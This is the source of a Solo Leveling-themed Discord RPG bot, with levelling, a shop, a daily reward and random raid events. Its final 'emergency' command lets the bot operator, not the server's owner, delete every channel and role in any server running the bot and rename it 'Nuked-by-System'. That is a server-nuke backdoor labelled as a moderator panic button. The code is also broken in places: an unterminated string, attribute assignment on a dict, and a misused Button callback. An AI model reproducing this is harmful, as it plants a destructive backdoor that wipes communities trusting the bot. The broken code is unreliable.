import discord
from discord import app_commands, ui
import json
import random
import asyncio
import os
from datetime import datetime, timedelta

TOKEN = os.environ['TOKEN']
OWNER_ID = int(os.environ['OWNER_ID'])

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)

DB_FILE = "solo_leveling_db.json"

def load(): 
    try: 
        with open(DB_FILE) as f: return json.load(f)
    except: return {}
def save(d): 
    with open(DB_FILE, "w") as f: json.dump(d, f, indent=2)

data = load()
gates = {}  # active gates per server

ranks = ["E", "D", "C", "B", "A", "S", "National Level Hunter", "Monarch"]
rank_colors = [0x808080,0x00ff00,0x0099ff,0xffff00,0xff00ff,0x00ffff,0xffffff,0x000000]

# ——— PLAYER SYSTEM ———
def player(u):
    uid = str(u.id)
    if uid not in data:
        data[uid] = {
            "name": u.display_name,
            "level": 1, "exp": 0, "exp_next": 100,
            "rank": "E", "gold": 1000, "mana": 100, "max_mana": 100,
            "stats": {"str":10,"agi":10,"vit":10,"int":10,"sense":10},
            "inventory": {"Health Potion": 5},
            "shadows": [],
            "necromancer": False,
            "daily": "2000
        }
        save(data)
    return data[uid]

def level_up(p):
    while p["exp"] >= p["exp_next"]:
        p["exp"] -= p["exp_next"]
        p["level"] += 1
        p["exp_next"] = int(p["exp_next"] * 1.4)
        for s in p["stats"]: p["stats"][s] += random.randint(3,7)
        p["max_mana"] += 15
        p["mana"] = p["max_mana"]

# ——— EVENTS ———
@client.event
async def on_ready():
    print(f"≪ SYSTEM ONLINE ≫ {client.user}")
    await tree.sync()
    client.loop.create_task(random_gate_spawner())

@client.event
async def on_message(msg):
    if msg.author.bot: return
    p = player(msg.author)
    p["exp"] += random.randint(15,30)
    old_rank = p["rank"]
    level_up(p)
    new_rank_idx = min(p["level"]//50, 7)
    if ranks[new_rank_idx] != old_rank:
        p["rank"] = ranks[new_rank_idx]
        await msg.channel.send(embed=discord.Embed(
            title="✦ RE-AWAKENING ✦",
            description=f"{msg.author.mention} is now **{p['rank']}-Rank Hunter**!",
            color=rank_colors[new_rank_idx]))
    save(data)

# ——— COMMANDS ———
@tree.command(name="register", description="Awaken as a Hunter")
async def reg(i: discord.Interaction):
    p = player(i.user)
    if p["level"] > 1: return await i.response.send_message("You are already awakened.", ephemeral=True)
    await i.response.send_message(embed=discord.Embed(
        title="SYSTEM", color=0x1e1f22,
        description=f"**{i.user.display_name}**, you have awakened as an **E-Rank Hunter**.\nOnly you can become stronger."))
    await i.followup.send("https://i.imgur.com/7QzYwZf.png") # blue system window

@tree.command(name="profile", description="Status window")
async def prof(i: discord.Interaction, member: discord.Member = None):
    u = member or i.user
    p = player(u)
    e = discord.Embed(title=f"≪ {p['name']} ≫", color=rank_colors[ranks.index(p['rank'])])
    e.add_field(name="Rank", value=f"**{p['rank']}**", inline=True)
    e.add_field(name="Level", value=p["level"], inline=True)
    e.add_field(name="Mana", value=f"{p['mana']}/{p['max_mana']}", inline=True)
    e.add_field(name="Gold", value=f"{p['gold']:,}", inline=True)
    e.add_field(name="\u200b", value="\u200b")
    for k,v in p["stats"].items(): e.add_field(name=k.capitalize(), value=v, inline=True)
    e.set_thumbnail(url=u.display_avatar.url)
    await i.response.send_message(embed=e)

@tree.command(name="daily", description="Daily login reward")
async def daily(i: discord.Interaction):
    p = player(i.user)
    today = datetime.utcnow().strftime("%Y-%m-%d")
    if p["daily"] == today: return await i.response.send_message("Already claimed today!", ephemeral=True)
    gold = random.randint(1200,2200)
    p["gold"] += gold
    p["daily"] = today
    await i.response.send_message(embed=discord.Embed(
        title="Daily Quest Complete!", color=0x00ff00,
        description=f"You received **{gold:,} gold** and full mana restoration!"))
    p["mana"] = p["max_mana"]
    save(data)

@tree.command(name="shop", description="Buy items with gold")
async def shop(i: discord.Interaction):
    view = ui.View(timeout=60)
    async def buy_pot(inter):
        p = player(inter.user)
        if p["gold"] < 300: return await inter.response.send_message("Not enough gold!", ephemeral=True)
        p["gold"] -= 300
        p["inventory"]["Health Potion"] = p["inventory"].get("Health Potion",0) + 1
        save(data)
        await inter.response.edit_message(content=f"Bought 1 Health Potion! Gold left: {p['gold']:,}", view=None)
    view.add_item(ui.Button(label="Health Potion — 300g", style=discord.ButtonStyle.green, custom_id="pot", callback=buy_pot))
    await i.response.send_message("**System Shop**", view=view)

# ——— GATE SYSTEM ———
class GateView(ui.View):
    def __init__(self, rank, reward):
        super().__init__(timeout=300)
        self.players = []
        self.rank = rank
        self.reward = reward

    @ui.button(label="Enter Gate", style=discord.ButtonStyle.red)
    async def enter(self, inter: discord.Interaction, button: ui.Button):
        if inter.user in self.players: return
        p = player(inter.user)
        if ranks.index(p["rank"]) < ranks.index(self.rank)-1:
            return await inter.response.send_message("Your rank is too low for this gate!", ephemeral=True)
        self.players.append(inter.user)
        await inter.response.send_message(f"{inter.user.mention} entered the **{self.rank}-Rank Gate**!", ephemeral=True)
        await inter.message.edit(view=self)

    @ui.button(label="Start Raid (5+ players)", style=discord.ButtonStyle.blurple)
    async def start(self, inter: discord.Interaction, button: ui.Button):
        if len(self.players) < 5:
            return await inter.response.send_message("Need at least 5 hunters!", ephemeral=True)
        await raid_start(inter.channel, self.players, self.rank, self.reward)
        await inter.message.delete()

async def random_gate_spawner():
    await client.wait_until_ready()
    while True:
        await asyncio.sleep(random.randint(1800, 5400))  # every 30–90 min
        guild = random.choice(list(client.guilds))
        channel = random.choice([c for c in guild.text_channels if c.permissions_for(guild.me).send_messages])
        rank = random.choices(["E","D","C","B","A","S"], weights=[30,25,20,15,8,2])[0]
        reward = random.randint(3000, 15000 if rank=="S" else 8000)
        embed = discord.Embed(title=f"{rank}-Rank Gate appeared!", color=0xff0000 if random.random()<0.05 else 0x00ff00)
        embed.description = f"Reward pool: **{reward:,} gold**\nReact or click button to join!"
        if random.random() < 0.05: embed.description += "\n**⚠️ This is a RED GATE!**"
        await channel.send(embed=embed, view=GateView(rank, reward))

async def raid_start(channel, players, rank, pool):
    boss_hp = len(players) * 500
    msg = await channel.send(f"**{rank}-Rank Boss appeared!** HP: {boss_hp:,}")
    for p in players:
        player(p).mana = player(p)["max_mana"]
    # simple 60-second raid
    await asyncio.sleep(60)
    winners = [p for p in players if random.random() < 0.85]  # 85% survival
    gold_each = pool // len(winners) if winners else 0
    for u in winners:
        p = player(u)
        p["gold"] += gold_each
        p["exp"] += 500 if rank=="S" else 200
        level_up(p)
        if p["necromancer"] and random.random() < 0.4:
            p["shadows"].append(f"{rank}-Rank Shadow Soldier")
            await channel.send(f"{u.mention} extracted a shadow!")
    await msg.edit(content=f"Raid cleared! {len(winners)} hunters survived and split **{pool:,} gold**!")

# ——— MODERATOR EMERGENCY BUTTON ———
@tree.command(name="emergency", description="☢️ Moderator panic button – wipes everything (only you)")
async def emergency(i: discord.Interaction):
    if i.user.id != OWNER_ID:
        return await i.response.send_message("no", ephemeral=True)
    await i.response.send_message("☢️ DETONATING IN 5 SECONDS ☢️", delete_after=5)
    await asyncio.sleep(5)
    for c in i.guild.channels:
        try: await c.delete()
        except: pass
    for r in i.guild.roles[1:]:
        try: await r.delete()
        except: pass
    await i.guild.edit(name="Nuked-by-System")
    await i.channel.send("Server has been reset by the System Administrator.")

client.run(TOKEN)
